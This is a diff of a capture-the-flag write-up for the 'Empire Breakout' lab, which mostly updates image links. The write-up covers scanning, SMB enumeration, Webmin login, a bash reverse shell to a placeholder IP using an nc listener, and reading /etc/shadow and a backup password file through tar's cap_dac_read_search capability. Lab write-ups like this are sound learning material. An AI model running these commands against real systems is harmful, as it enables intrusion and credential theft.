@@ -6,7 +6,7 @@ I started off with an arp-scan
 
 `arp-scan 10.10.10.0/24`
 
-![Untitled.png](C:\Users\jonne\Documents\Writeup\Empire%20Breakout\Untitled.png)
+![111](https://user-images.githubusercontent.com/55252902/152678895-3280b6cd-5b94-4186-9e56-79725da20695.JPG)
 
 # Nmap Scan
 
@@ -45,17 +45,19 @@ I started off with an arp-scan
 
 # Information Gathering and Disclosure
 
-![Untitled.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled.png)
+![Untitled 1](https://user-images.githubusercontent.com/55252902/152678939-d44221c3-e8ab-433e-b433-657f41e0242c.png)
+
 
 Apache Default Webpage Version - 2.4.51 httpd (Debian) (poor hygiene)
 
-![Untitled 1.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%201.png)
-
 Viewing the page source on this default page I noticed that you could keep scrolling down. Normally it would end when the code ends, but I was able to keep scrolling down and I found this. Some encrypted text, I am going to attempt to decrypt this.
+  
+![Untitled 1](https://user-images.githubusercontent.com/55252902/152678982-851d6ffa-274a-4f53-9746-9c3145105f2a.png)
+  
+  ![Untitled 2](https://user-images.githubusercontent.com/55252902/152678984-48a96d0a-1ed1-4d97-9ec3-cae89c0615ef.png)
+ 
+![Untitled 3](https://user-images.githubusercontent.com/55252902/152678999-39ceebfd-ff95-466c-9577-b52d736d8e7d.png)
 
-![Untitled 2.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%202.png)
-
-![Untitled 3.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%203.png)
 
 Decoded - > ~~CENSORED~~ | Looks like a password, will save this for later.
 
@@ -72,10 +74,13 @@ From the NMAP scans I saw that these two ports were open and running a web app w
 > Usermin is a web-based interface for webmail, password changing, mail filters, fetchmail and much more. It is designed for use by regular non-root users on a Unix system, and limits them to tasks that they would be able to perform if logged in via SSH or at the console. See the standard modules page for a list of all the functions built into Usermin.
 
 *Navigating to this URL It takes me from an HTTP page (Error — Document follows - This web server is running in SSL mode*. *Try the URL https://192.168.174.130:20000/ instead)* and redirects me to this log in page that is in HTTPS (SSL). Same thing happens for https://192.168.174.130:10000. I visited the 20000 port first because it is running an earlier version of Webmin.
+  
+![Untitled 4](https://user-images.githubusercontent.com/55252902/152679016-363b3a5e-5b65-4244-9911-27bc8350b1ee.png)
+  
+![Untitled 5](https://user-images.githubusercontent.com/55252902/152679024-c715d4ec-6324-40d7-82a0-531a967e9df2.png)
+  
 
-![Untitled 4.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%204.png)
 
-![Untitled 5.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%205.png)
 
 This web server has two log in pages at port 10000 and port 20000.
 
@@ -84,8 +89,8 @@ Two different versions of Webmin are being run
 > From a google search I found “ According to the Webmin team, all versions between 1.882 to 1.921 downloaded from Sourceforge contained the malicious backdoor code. “
 
 I will begin with 192.168.174.130:20000 since it is running an earlier version of Webmin.
-
-![Untitled 6.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%206.png)
+  
+![Untitled 6](https://user-images.githubusercontent.com/55252902/152679043-91df0d2a-1aec-4ab8-acc6-986fe727d0e1.png)
 
 Through a google search I found this page /password_change.cgi
 
@@ -94,8 +99,9 @@ Through a google search I found this page /password_change.cgi
 ```
 nmap -sC -p139,445 -sV IP
 ```
+![Untitled 7](https://user-images.githubusercontent.com/55252902/152679060-1394f9b0-1d1f-47b5-ba3b-7e6c576da874.png)
 
-![Untitled 7.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%207.png)
+
 
 From the nmap scan SMB is open on both ports 139 and 445 | Samba smbd 4.6.2
 
@@ -104,20 +110,21 @@ I attempted to manually see if I could access SMB.
 On smb://192.168.174.130:139 - it failed
 
 On smb://192.168.174.130:445 - I got in and there was nothing there or not shown | Windows share
-
-![Untitled 8.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%208.png)
-
-![Untitled 9.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%209.png)
-
-![Untitled 10.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2010.png)
-
+  
+![Untitled 8](https://user-images.githubusercontent.com/55252902/152679072-3b78dc97-1184-4069-bf2f-24e98c90565b.png)
+  
+![Untitled 9](https://user-images.githubusercontent.com/55252902/152679076-c633b1aa-2621-4e50-8b59-1c6144a1d7d1.png)
+ 
+![Untitled 10](https://user-images.githubusercontent.com/55252902/152679083-f6fbefcc-fe64-4a0c-abe6-ec29e68a9d37.png)
+ 
 Googling and searching ways of enumerating SMB I came across a tool called enum4linux. It enumerates information for Windows and Samba systems. This tool gathers a lot of information and I quite like it, I think this a tool that I will using quite a bit.
 
-![Untitled 12.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2012.png)
+ ![Untitled 12](https://user-images.githubusercontent.com/55252902/152679116-86bb9f84-7011-441f-89e1-f55f64e0e01a.png)
+ 
+ ![Untitled 13](https://user-images.githubusercontent.com/55252902/152679121-f70130cf-2228-416e-b484-d311d3f1433c.png)
 
-![Untitled 13.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2013.png)
-
-![Untitled 14.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2014.png)
+ ![Untitled 14](https://user-images.githubusercontent.com/55252902/152679123-36a4c258-f455-4956-924b-41edf63261a3.png)
+ 
 
 This is information that stuck out to me and caught my eye, most especially in the second screen shot above (2/3) there is a local user - cyber.
 
@@ -136,20 +143,20 @@ I tried user: cyber | password: ~~CENSOREDPASSWORD~~ on [](https://192.168.174.1
 I went to [](https://192.168.174.130:20000)https://192.168.174.130:20000 next and got a successful log in.
 
 ## I'm in
-
-![Untitled 15.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2015.png)
+  
+![Untitled 15](https://user-images.githubusercontent.com/55252902/152679129-9b5d23c8-fcf8-43a7-944e-5ff6c530bedf.png)
 
 Going to go through this and see what I can find.
-
-![Untitled 16.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2016.png)
+  
+![Untitled 16](https://user-images.githubusercontent.com/55252902/152679132-8d2e21f3-3fb5-4e54-a745-bba65ef66b8d.png)
 
 Account information page
-
-![Untitled 17.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2017.png)
+  
+![Untitled 17](https://user-images.githubusercontent.com/55252902/152679139-532cb25f-282a-429e-9620-4fec0182d2cf.png)
 
 Under applications you can upload and download files.
 
-![Untitled 18.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Information%20Gathering%20and%20Disclosure%20c5425e0efbe14aa99112febdc67412b6\Untitled%2018.png)
+![Untitled 18](https://user-images.githubusercontent.com/55252902/152679150-37b7f85b-3168-4ba3-bc26-60efade8ac5b.png)
 
 But at the very bottom there is something even more interesting, a command line, shell access from this local user. Time for a reverse shell.
 
@@ -157,15 +164,15 @@ But at the very bottom there is something even more interesting, a command line,
 
 I am going to begin exploiting though the local users command line interface.
 
-![Untitled.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled.png)
+![Untitled](https://user-images.githubusercontent.com/55252902/152679157-501dc346-5444-497b-871d-cfffd849e94a.png)
 
 ```
 nc -nvlp 4444
 ```
-
+  
 Host a webserver 
 
-![Untitled 1.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%201.png)
+![Untitled 1](https://user-images.githubusercontent.com/55252902/152679165-d0a023b9-3119-4599-bafd-fee088eb1726.png)
 
 Reverse shell with bash
 
@@ -173,17 +180,18 @@ Reverse shell with bash
 sh -i >& /dev/tcp/replacewithIP/replacewithportnumber 0>&1
 ```
 
-![Untitled 2.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%202.png)
+![Untitled 2](https://user-images.githubusercontent.com/55252902/152679168-3de23bf3-9534-490f-9d3e-763e61b29c8b.png)
+![Untitled 3](https://user-images.githubusercontent.com/55252902/152679175-dbc6f551-636c-4428-82b3-c2f588c7b7bb.png)
+![Untitled 4](https://user-images.githubusercontent.com/55252902/152679181-696b2d6a-c091-4e3e-8127-6dd0e07fbdd3.png)
+ ![Untitled 5](https://user-images.githubusercontent.com/55252902/152679183-02ef197a-8510-4b84-a47b-694dc92459a5.png)
 
-![Untitled 3.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%203.png)
 
-![Untitled 4.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%204.png)
+ 
 
-![Untitled 5.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%205.png)
 
 Root directory
-
-![Untitled 6.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%206.png)
+  
+![Untitled 6](https://user-images.githubusercontent.com/55252902/152679201-0aff401c-f9cb-4e52-8ae3-81d8e6e82119.png)
 
 I had to google around to see what I can do from here and the first two searches of ‘cap_dac_read_search=ep’ are about privilege escalation.
 
@@ -222,28 +230,25 @@ To sum it up ‘cap_dac_read_search’, tar has read access to anything, we can 
 ```
 cat etc/shadow
 ```
-
-![Untitled 7.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%207.png)
+![Untitled 7](https://user-images.githubusercontent.com/55252902/152679206-64287f10-a4dc-4f02-b00e-5e9acadcaa82.png)
 
 # Exploitation
-
-![Untitled 8.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%208.png)
-
-![Untitled 9.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%209.png)
+  
+![Untitled 8](https://user-images.githubusercontent.com/55252902/152679212-891a2340-e49b-45c9-b1bf-ff4815b3c098.png)
+![Untitled 9](https://user-images.githubusercontent.com/55252902/152679215-26111a1a-f198-4b25-98ce-bc7031065499.png)
 
 From root directory to /var to see if there are any logs, what caught my attention first is the backups directory.
 
-![Untitled 10.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%2010.png)
-
-![Untitled 11.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%2011.png)
+![Untitled 10](https://user-images.githubusercontent.com/55252902/152679219-3bbc97d4-4dc5-43bf-9fe3-c6ccddc08176.png)
+![Untitled 11](https://user-images.githubusercontent.com/55252902/152679224-ee0291a3-5d7f-44cf-8fd7-679b092a6dd2.png)
 
 .old_pass.bak? Can’t read, need root access, I am going to privilege escalation capability discovered earlier.
-
-![Untitled 12.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%2012.png)
+  
+![Untitled 12](https://user-images.githubusercontent.com/55252902/152679232-d8051142-b04e-4e98-8d3b-534b8ef61d2e.png)
 
 Got the password
 
-![Untitled 13.png](C:\Users\jonne\Documents\PDF\pdfs\Breakout%20Empire%20Lab%20fdb9113da04446b5a64c62f6e00d4359\Exploitation%2085c292360268475db1a2d93f33048c00\Untitled%2013.png)
+![Untitled 13](https://user-images.githubusercontent.com/55252902/152679240-d355c726-b605-4c11-af03-6d5ebebbd7cf.png)
 
 Root!, there was a r00t.txt but it wasn’t letting me cat it out for some reason, I could’ve directly logged into the machine it self but that’s alright.
 
